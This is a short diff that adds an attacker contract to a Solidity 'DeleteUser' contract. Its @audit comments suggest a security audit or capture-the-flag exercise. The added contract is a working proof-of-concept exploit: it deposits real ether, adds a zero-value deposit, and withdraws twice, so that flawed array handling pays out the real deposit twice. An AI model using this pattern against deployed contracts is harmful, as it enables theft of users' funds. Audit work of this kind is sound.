@@ -30,3 +30,23 @@ contract DeleteUser {
         msg.sender.call{value: amount}("");
     }
 }
+
+contract DeleteUserAttacker {
+    DeleteUser deleteUser;
+
+    constructor(DeleteUser _deleteUser) {
+        deleteUser = DeleteUser(_deleteUser);
+    }
+
+    function attack() external payable {
+        //@audit The attacker deposits 1 ether into the contract
+
+        deleteUser.deposit{value: msg.value}();
+        deleteUser.deposit{value: 0}();
+        //@audit The attacker withdraws the 1 ether they deposited
+        deleteUser.withdraw(1); //will just pop the last element (which is the deposit with value 0)
+        deleteUser.withdraw(1); //will now pop the element with actually 1 ether as value
+    }
+
+    receive() external payable {}
+}
